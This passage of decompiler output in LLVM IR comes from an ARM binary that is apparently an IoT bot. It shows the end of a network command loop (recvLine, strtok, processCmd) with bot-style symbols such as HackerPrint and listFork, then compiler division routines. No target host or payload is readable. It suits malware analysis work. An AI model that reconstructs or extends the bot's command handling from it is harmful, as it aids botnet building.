dec_label_pc_13980:                               ; preds = %dec_label_pc_13958
  %v1_13984 = call i32 @fdpclose(i32 %v3_13910)
  %v1_1398c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_1389c, %dec_label_pc_13980
  store i32 %v1_1384c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_24064.1307 to i32), i32* @r1, align 4
  %v2_139a4 = call i32 @__GI_strtok(i32 %v1_1384c, i32 ptrtoint (i32* @global_var_24064.1307 to i32))
  store i8* %v5_13788, i8** %stack_var_-132, align 4
  %v2_13a9c40 = icmp eq i32 %v2_139a4, 0
  br i1 %v2_13a9c40, label %dec_label_pc_13aa4, label %dec_label_pc_139bc

dec_label_pc_139bc:                               ; preds = %dec_label_pc_13990, %dec_label_pc_13a84
  %stack_var_-36.043.in = phi i32 [ %v2_13a8c, %dec_label_pc_13a84 ], [ %v2_139a4, %dec_label_pc_13990 ]
  %stack_var_-40.141 = phi i32 [ %stack_var_-40.0, %dec_label_pc_13a84 ], [ 1, %dec_label_pc_13990 ]
  %stack_var_-36.043 = inttoptr i32 %stack_var_-36.043.in to i8*
  %v2_139c0 = load i8, i8* %stack_var_-36.043, align 1
  %v7_139c4 = icmp eq i8 %v2_139c0, 10
  br i1 %v7_139c4, label %dec_label_pc_13a84, label %dec_label_pc_139cc

dec_label_pc_139cc:                               ; preds = %dec_label_pc_139bc
  store i32 %stack_var_-40.141, i32* @r4, align 4
  %v3_139d8 = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_139e0 = add i32 %v3_139d8, 1
  %v1_139e8 = call i32 @malloc(i32 %v1_139e0)
  %v0_139f8 = load i32, i32* @r4, align 4
  %v3_139f8 = mul i32 %v0_139f8, 4
  %v2_13a04 = add i32 %v2_13ae4, %v3_139f8
  %v2_13a08 = inttoptr i32 %v2_13a04 to i32*
  store i32 %v1_139e8, i32* %v2_13a08, align 4
  %v3_13a14 = mul i32 %stack_var_-40.141, 4
  %v2_13a20 = add i32 %v2_13ae4, %v3_13a14
  %v1_13a24 = inttoptr i32 %v2_13a20 to i32*
  %v2_13a24 = load i32, i32* %v1_13a24, align 4
  store i32 %v2_13a24, i32* @r4, align 4
  %v3_13a30 = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_13a38 = add i32 %v3_13a30, 1
  %v0_13a3c = load i32, i32* @r4, align 4
  store i32 %v1_13a38, i32* @r2, align 4
  %v2_13a48 = inttoptr i32 %v0_13a3c to i8*
  %v3_13a48 = call i32 @__GI_memset(i8* %v2_13a48, i32 0)
  %v2_13a64 = load i32, i32* %v1_13a24, align 4
  store i32 %stack_var_-36.043.in, i32* @r1, align 4
  %v3_13a74 = inttoptr i32 %v2_13a64 to i8*
  %v4_13a74 = call i32 @strcpy(i8* %v3_13a74, i32 %stack_var_-36.043.in)
  %v1_13a7c = add i32 %stack_var_-40.141, 1
  br label %dec_label_pc_13a84

dec_label_pc_13a84:                               ; preds = %dec_label_pc_139bc, %dec_label_pc_139cc
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.141, %dec_label_pc_139bc ], [ %v1_13a7c, %dec_label_pc_139cc ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_24064.1307 to i32), i32* @r1, align 4
  %v2_13a8c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_24064.1307 to i32))
  %v2_13a9c = icmp eq i32 %v2_13a8c, 0
  br i1 %v2_13a9c, label %dec_label_pc_13aa4, label %dec_label_pc_139bc

dec_label_pc_13aa4:                               ; preds = %dec_label_pc_13a84, %dec_label_pc_13990
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_13990 ], [ %stack_var_-40.0, %dec_label_pc_13a84 ]
  %v3_13ab0 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* %v2_13ab0)
  %v7_13abc = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_13abc, label %dec_label_pc_13b14, label %dec_label_pc_13ad4.lr.ph

dec_label_pc_13ad4.lr.ph:                         ; preds = %dec_label_pc_13aa4
  br label %dec_label_pc_13ad4

dec_label_pc_13ad4:                               ; preds = %dec_label_pc_13ad4.lr.ph, %dec_label_pc_13ad4
  %storemerge18106 = phi i32 [ 1, %dec_label_pc_13ad4.lr.ph ], [ %v1_13afc, %dec_label_pc_13ad4 ]
  %v3_13adc = mul i32 %storemerge18106, 4
  %v2_13ae8 = add i32 %v2_13ae4, %v3_13adc
  %v1_13aec = inttoptr i32 %v2_13ae8 to i32*
  %v2_13aec = load i32, i32* %v1_13aec, align 4
  store i32 %v2_13aec, i32* @r0, align 4
  %v0_13af4 = call i32 @free()
  %v1_13afc = add nuw nsw i32 %storemerge18106, 1
  %v5_13b10 = icmp slt i32 %v1_13afc, %stack_var_-40.1.lcssa
  br i1 %v5_13b10, label %dec_label_pc_13ad4, label %dec_label_pc_13b14

dec_label_pc_13b14:                               ; preds = %dec_label_pc_13ad4, %dec_label_pc_138ac, %dec_label_pc_136e4, %dec_label_pc_13aa4, %dec_label_pc_13740, %dec_label_pc_13694, %dec_label_pc_13300
  %v2_13b18 = load i32, i32* @global_var_2e45c.55, align 4
  %v5_13b34 = call i32 @recvLine(i32 %v2_13b18, i8* %v4_13b34, i32 4096, i32 %v2_13b24)
  %v3_13b44 = icmp eq i32 %v5_13b34, -1
  br i1 %v3_13b44, label %dec_label_pc_132e4, label %dec_label_pc_135bc

; uselistorder directives
  uselistorder i32 %v5_13b34, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v2_13a8c, { 1, 0 }
  uselistorder i8* %stack_var_-36.043, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.141, { 1, 3, 0, 2 }
  uselistorder i8* %v5_13888, { 1, 0 }
  uselistorder i32 %v1_13884, { 1, 0 }
  uselistorder i8* %storemerge936, { 1, 0 }
  uselistorder i32 %v1_1384c, { 1, 2, 0 }
  uselistorder i32 %v1_137b8, { 2, 1, 0 }
  uselistorder i8* %v5_13788, { 5, 6, 0, 3, 2, 1, 4, 7, 9, 8 }
  uselistorder i32 %v1_13784, { 0, 2, 1, 3 }
  uselistorder i8* %storemerge10, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_135f8, { 1, 0 }
  uselistorder i32 %v3_135c4, { 1, 0 }
  uselistorder i32 %storemerge16, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_134e4, { 1, 0 }
  uselistorder i32 %v1_134c8, { 1, 0 }
  uselistorder i32 %v1_13398, { 1, 2, 0, 3 }
  uselistorder i32 %v3_133b4, { 1, 0 }
  uselistorder i32 %v2_133a8, { 1, 0 }
  uselistorder i32 %v2_13ae4, { 2, 0, 1 }
  uselistorder i32 %v2_138c4, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_13b34, { 3, 0, 1, 2 }
  uselistorder i32 %v2_13b24, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-132, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24064.1307 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2e460.61, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_346c0.64, { 0, 2, 3, 4, 5, 6, 7, 1, 10, 8, 9 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 3, 2, 1, 6, 5, 4, 17, 16, 0 }
  uselistorder i32* @global_var_2e45c.55, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_346b4.479, { 1, 2, 0, 5, 3, 4 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13b14, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_13ad4, { 1, 0 }
  uselistorder label %dec_label_pc_13a84, { 1, 0 }
  uselistorder label %dec_label_pc_139bc, { 1, 0 }
  uselistorder label %dec_label_pc_13990, { 1, 0 }
  uselistorder label %dec_label_pc_13958, { 1, 0 }
  uselistorder label %dec_label_pc_13860, { 1, 0 }
  uselistorder label %dec_label_pc_1383c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1382c, { 1, 0 }
  uselistorder label %dec_label_pc_137b4, { 1, 0 }
  uselistorder label %dec_label_pc_13720, { 1, 0 }
  uselistorder label %dec_label_pc_136e4, { 1, 0 }
  uselistorder label %dec_label_pc_13630, { 1, 0 }
  uselistorder label %dec_label_pc_135b0, { 1, 0 }
  uselistorder label %dec_label_pc_13520, { 1, 0 }
  uselistorder label %dec_label_pc_134e0, { 1, 0 }
  uselistorder label %dec_label_pc_133e8, { 1, 0 }
  uselistorder label %dec_label_pc_133a4, { 1, 0 }
  uselistorder label %dec_label_pc_132e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13168, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13b9c = add i32 %arg2, -1
  %v7_13b9c = icmp eq i32 %arg2, 1
  br i1 %v7_13b9c, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_13ba0 = load i32, i32* @r0, align 4
  ret i32 %v2_13ba0

bb80:                                             ; preds = %entry
  %v2_13b9c = icmp eq i32 %arg2, 0
  br i1 %v2_13b9c, label %dec_label_pc_13c84, label %dec_label_pc_13ba8

dec_label_pc_13ba8:                               ; preds = %bb80
  %v0_13ba8 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_13ba8, %arg2
  br i1 %tmp, label %dec_label_pc_13bb0, label %dec_label_pc_13c3c

dec_label_pc_13bb0:                               ; preds = %dec_label_pc_13ba8
  %v2_13bb0 = and i32 %v1_13b9c, %arg2
  %v4_13bb0 = icmp eq i32 %v2_13bb0, 0
  br i1 %v4_13bb0, label %dec_label_pc_13c48, label %dec_label_pc_13bb8

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13bb0
  %v3_13bb8 = icmp ult i32 %arg2, 536870912
  br i1 %v3_13bb8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13bb8
  %v4_13bbc = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13bb8, %.thread
  %v0_13bdc.pr36.ph = phi i32 [ %v4_13bbc, %.thread ], [ %arg2, %dec_label_pc_13bb8 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13bb8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_13bdc.pr36 = phi i32 [ %v4_13bd0, %bb83 ], [ %v0_13bdc.pr36.ph, %.preheader.preheader ]
  %v1_13bd4 = phi i32 [ %v4_13bd4, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_13bc8 = icmp ugt i32 %v0_13bdc.pr36, 268435455
  br i1 %v2_13bc8, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13bdcthread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_13bcc = icmp ult i32 %v0_13bdc.pr36, %v0_13ba8
  br i1 %v4_13bcc, label %bb82, label %dec_label_pc_13bdcthread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_13bd0 = and i32 %v0_13bdc.pr36, 268435456
  %v3_13bd0 = icmp eq i32 %v2_13bd0, 0
  %v4_13bd0 = mul i32 %v0_13bdc.pr36, 16
  br i1 %v3_13bd0, label %bb83, label %dec_label_pc_13bdc.loopexit

bb83:                                             ; preds = %bb82
  %v2_13bd4 = and i32 %v1_13bd4, 268435456
  %v3_13bd4 = icmp eq i32 %v2_13bd4, 0
  %v4_13bd4 = mul i32 %v1_13bd4, 16
  br i1 %v3_13bd4, label %.preheader, label %dec_label_pc_13bdcthread-pre-split.loopexit.loopexit

dec_label_pc_13bdcthread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_13be848.ph = phi i32 [ %v1_13bd4, %bb81 ], [ %v4_13bd4, %bb83 ]
  %v0_13bdc.pr38.ph = phi i32 [ %v0_13bdc.pr36, %bb81 ], [ %v4_13bd0, %bb83 ]
  br label %dec_label_pc_13bdcthread-pre-split.loopexit

dec_label_pc_13bdcthread-pre-split.loopexit:      ; preds = %dec_label_pc_13bdcthread-pre-split.loopexit.loopexit, %.thread2
  %v1_13be848 = phi i32 [ %v1_13bd4, %.thread2 ], [ %v1_13be848.ph, %dec_label_pc_13bdcthread-pre-split.loopexit.loopexit ]
  %v0_13bdc.pr38 = phi i32 [ %v0_13bdc.pr36, %.thread2 ], [ %v0_13bdc.pr38.ph, %dec_label_pc_13bdcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13bdcthread-pre-split

dec_label_pc_13bdcthread-pre-split:               ; preds = %dec_label_pc_13bdcthread-pre-split.loopexit, %bb85
  %v1_13be846 = phi i32 [ %v1_13be848, %dec_label_pc_13bdcthread-pre-split.loopexit ], [ %v3_13be8, %bb85 ]
  %v0_13bdc.pr = phi i32 [ %v0_13bdc.pr38, %dec_label_pc_13bdcthread-pre-split.loopexit ], [ %v3_13be4, %bb85 ]
  br label %dec_label_pc_13bdc

dec_label_pc_13bdc.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_13bdc

dec_label_pc_13bdc:                               ; preds = %dec_label_pc_13bdc.loopexit, %dec_label_pc_13bdcthread-pre-split
  %v1_13be8 = phi i32 [ %v1_13be846, %dec_label_pc_13bdcthread-pre-split ], [ %v1_13bd4, %dec_label_pc_13bdc.loopexit ]
  %v1_13be4 = phi i32 [ %v0_13bdc.pr, %dec_label_pc_13bdcthread-pre-split ], [ %v4_13bd0, %dec_label_pc_13bdc.loopexit ]
  %v2_13bdc = icmp slt i32 %v1_13be4, 0
  br i1 %v2_13bdc, label %dec_label_pc_13bf0, label %bb84

bb84:                                             ; preds = %dec_label_pc_13bdc
  %v4_13be0 = icmp ult i32 %v1_13be4, %v0_13ba8
  br i1 %v4_13be0, label %bb85, label %dec_label_pc_13bf0

bb85:                                             ; preds = %bb84
  %v3_13be4 = mul i32 %v1_13be4, 2
  %v2_13be8 = icmp slt i32 %v1_13be8, 0
  %v3_13be8 = mul i32 %v1_13be8, 2
  br i1 %v2_13be8, label %dec_label_pc_13bf0, label %dec_label_pc_13bdcthread-pre-split

dec_label_pc_13bf0:                               ; preds = %bb84, %dec_label_pc_13bdc, %bb85
  %v2_13bfc59 = phi i32 [ %v3_13be8, %bb85 ], [ %v1_13be8, %bb84 ], [ %v1_13be8, %dec_label_pc_13bdc ]
  %v1_13bf451 = phi i32 [ %v3_13be4, %bb85 ], [ %v1_13be4, %bb84 ], [ %v1_13be4, %dec_label_pc_13bdc ]
  br label %dec_label_pc_13bf4

dec_label_pc_13bf4:                               ; preds = %.thread11, %dec_label_pc_13bf0
  %v1_13c28 = phi i32 [ %v4_13c28, %.thread11 ], [ %v2_13bfc59, %dec_label_pc_13bf0 ]
  %v1_13bfc = phi i32 [ %v0_13c34, %.thread11 ], [ 0, %dec_label_pc_13bf0 ]
  %v1_13c2c = phi i32 [ %v4_13c2c, %.thread11 ], [ %v1_13bf451, %dec_label_pc_13bf0 ]
  %v1_13bf8 = phi i32 [ %v0_13c24, %.thread11 ], [ %v0_13ba8, %dec_label_pc_13bf0 ]
  %v3_13bf4 = icmp ult i32 %v1_13bf8, %v1_13c2c
  br i1 %v3_13bf4, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_13bf4
  %v3_13bf8 = sub i32 %v1_13bf8, %v1_13c2c
  %v3_13bfc = or i32 %v1_13bfc, %v1_13c28
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13bf4, %bb86
  %v1_13c04 = phi i32 [ %v1_13bf8, %dec_label_pc_13bf4 ], [ %v3_13bf8, %bb86 ]
  %v1_13c08 = phi i32 [ %v1_13bfc, %dec_label_pc_13bf4 ], [ %v3_13bfc, %bb86 ]
  %v4_13c00 = udiv i32 %v1_13c2c, 2
  %v6_13c00 = icmp ult i32 %v1_13c04, %v4_13c00
  br i1 %v6_13c00, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_13c04 = urem i32 %v1_13c2c, 2
  %v4_13c04 = icmp eq i32 %v3_13c04, 0
  %v6_13c04 = sub i32 %v1_13c04, %v4_13c00
  br i1 %v4_13c04, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_13c08 = udiv i32 %v1_13c28, 2
  %v6_13c08 = or i32 %v1_13c08, %v5_13c08
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_13c10 = phi i32 [ %v6_13c04, %bb87 ], [ %v1_13c04, %.thread7 ], [ %v6_13c04, %bb88 ]
  %v1_13c14 = phi i32 [ %v1_13c08, %bb87 ], [ %v1_13c08, %.thread7 ], [ %v6_13c08, %bb88 ]
  %v4_13c0c = udiv i32 %v1_13c2c, 4
  %v6_13c0c = icmp ult i32 %v1_13c10, %v4_13c0c
  br i1 %v6_13c0c, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_13c10 = and i32 %v1_13c2c, 2
  %v4_13c10 = icmp eq i32 %v3_13c10, 0
  %v6_13c10 = sub i32 %v1_13c10, %v4_13c0c
  br i1 %v4_13c10, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_13c14 = udiv i32 %v1_13c28, 4
  %v6_13c14 = or i32 %v1_13c14, %v5_13c14
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_13c1c = phi i32 [ %v6_13c10, %bb89 ], [ %v1_13c10, %.thread8 ], [ %v6_13c10, %bb90 ]
  %v1_13c20 = phi i32 [ %v1_13c14, %bb89 ], [ %v1_13c14, %.thread8 ], [ %v6_13c14, %bb90 ]
  %v4_13c18 = udiv i32 %v1_13c2c, 8
  %v6_13c18 = icmp ult i32 %v1_13c1c, %v4_13c18
  br i1 %v6_13c18, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_13c1c = and i32 %v1_13c2c, 4
  %v4_13c1c = icmp eq i32 %v3_13c1c, 0
  %v6_13c1c = sub i32 %v1_13c1c, %v4_13c18
  br i1 %v4_13c1c, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_13c20 = udiv i32 %v1_13c28, 8
  %v6_13c20 = or i32 %v1_13c20, %v5_13c20
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_13c34 = phi i32 [ %v1_13c20, %bb91 ], [ %v1_13c20, %.thread9 ], [ %v6_13c20, %bb92 ]
  %v0_13c24 = phi i32 [ %v6_13c1c, %bb91 ], [ %v1_13c1c, %.thread9 ], [ %v6_13c1c, %bb92 ]
  %v2_13c24 = icmp eq i32 %v0_13c24, 0
  br i1 %v2_13c24, label %dec_label_pc_13c34, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_13c28, 16
  br i1 %tmp140, label %dec_label_pc_13c34, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_13c28 = udiv i32 %v1_13c28, 16
  %v4_13c2c = udiv i32 %v1_13c2c, 16
  br label %dec_label_pc_13bf4

dec_label_pc_13c34:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_13c34

dec_label_pc_13c3c:                               ; preds = %dec_label_pc_13ba8
  %v9_13ba8 = icmp eq i32 %v0_13ba8, %arg2
  %. = zext i1 %v9_13ba8 to i32
  ret i32 %.

dec_label_pc_13c48:                               ; preds = %dec_label_pc_13bb0
  %v2_13c48 = icmp ugt i32 %arg2, 65535
  br i1 %v2_13c48, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_13c48
  %v2_13c4c = and i32 %arg2, 32768
  %v3_13c4c = icmp eq i32 %v2_13c4c, 0
  %v4_13c4c = udiv i32 %arg2, 65536
  br i1 %v3_13c4c, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_13c48
  %v0_13c5865 = phi i32 [ %arg2, %dec_label_pc_13c48 ], [ %v4_13c4c, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_13c5c = phi i32 [ %v0_13c5865, %.thread16 ], [ %v4_13c4c, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_13c58 = icmp ugt i32 %v1_13c5c, 255
  br i1 %v2_13c58, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_13c5c = and i32 %v1_13c5c, 128
  %v3_13c5c = icmp eq i32 %v2_13c5c, 0
  %v4_13c5c = udiv i32 %v1_13c5c, 256
  br i1 %v3_13c5c, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_13c60 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_13c6c = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_13c60, %bb100 ]
  %v1_13c68 = phi i32 [ %v1_13c5c, %bb98 ], [ %v4_13c5c, %bb99 ], [ %v4_13c5c, %bb100 ]
  %v2_13c64 = icmp ugt i32 %v1_13c68, 15
  br i1 %v2_13c64, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_13c68 = and i32 %v1_13c68, 8
  %v3_13c68 = icmp eq i32 %v2_13c68, 0
  %v4_13c68 = udiv i32 %v1_13c68, 16
  br i1 %v3_13c68, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_13c6c = add nsw i32 %v1_13c6c, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_13c74 = phi i32 [ %v1_13c6c, %.thread17 ], [ %v1_13c6c, %bb101 ], [ %v2_13c6c, %bb102 ]
  %v5_13c78 = phi i32 [ %v1_13c68, %.thread17 ], [ %v4_13c68, %bb101 ], [ %v4_13c68, %bb102 ]
  %v2_13c70 = icmp ugt i32 %v5_13c78, 3
  %v7_13c70 = icmp eq i32 %v5_13c78, 4
  %v2_13c74 = xor i1 %v7_13c70, true
  %v3_13c74 = and i1 %v2_13c70, %v2_13c74
  br i1 %v3_13c74, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_13c74 = add nsw i32 %v4_13c74, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_13c78 = phi i32 [ %v4_13c74, %.thread18 ], [ %v5_13c74, %bb103 ]
  %v2_13c78 = xor i1 %v2_13c70, true
  %v3_13c78 = or i1 %v7_13c70, %v2_13c78
  br i1 %v3_13c78, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_13c78 = udiv i32 %v5_13c78, 2
  %v9_13c78 = add i32 %v4_13c78, %v8_13c78
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_13c7c = phi i32 [ %v4_13c78, %bb104 ], [ %v9_13c78, %bb105 ]
  %v6_13c7c = lshr i32 %v0_13ba8, %v1_13c7c
  ret i32 %v6_13c7c

dec_label_pc_13c84:                               ; preds = %bb80
  %v0_13c84 = load i32, i32* @lr, align 4
  %v0_13c88 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13c84)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13c78, { 1, 0 }
  uselistorder i1 %v7_13c70, { 1, 0 }
  uselistorder i32 %v4_13c68, { 1, 0 }
  uselistorder i32 %v1_13c68, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c5c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_13c5c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c4c, { 1, 0 }
  uselistorder i32 %v0_13c24, { 1, 0 }
  uselistorder i32 %v4_13c18, { 1, 0 }
  uselistorder i32 %v1_13c20, { 1, 2, 0 }
  uselistorder i32 %v4_13c0c, { 1, 0 }
  uselistorder i32 %v1_13c14, { 1, 2, 0 }
  uselistorder i32 %v4_13c00, { 1, 0 }
  uselistorder i32 %v1_13c08, { 1, 2, 0 }
  uselistorder i32 %v1_13c2c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13bfc, { 1, 0 }
  uselistorder i32 %v1_13c28, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13be8, { 1, 0 }
  uselistorder i32 %v3_13be4, { 1, 0 }
  uselistorder i32 %v1_13be4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13be8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13bd4, { 1, 0 }
  uselistorder i32 %v4_13bd0, { 2, 1, 0 }
  uselistorder i32 %v1_13bd4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13bdc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_13ba8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_13c34, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13bf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13bdcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_13c98 = udiv i32 %arg1, %arg2
  ret i32 %v2_13c98
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13cac = add i32 %arg2, -1
  %v2_13cac = icmp eq i32 %arg2, 0
  br i1 %v2_13cac, label %dec_label_pc_13d68, label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %entry
  %v7_13cac = icmp eq i32 %arg2, 1
  br i1 %v7_13cac, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_13cb4
  %v1_13cb4 = load i32, i32* @r0, align 4
  %v10_13cb4 = icmp eq i32 %v1_13cb4, %arg2
  br i1 %v10_13cb4, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_13cb4, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_13cb4 = icmp ult i32 %v1_13cb4, %arg2
  br i1 %v4_13cb4, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_13cbc = and i32 %v1_13cac, %arg2
  %v8_13cbc = icmp eq i32 %v6_13cbc, 0
  br i1 %v8_13cbc, label %.thread67, label %dec_label_pc_13ccc.preheader

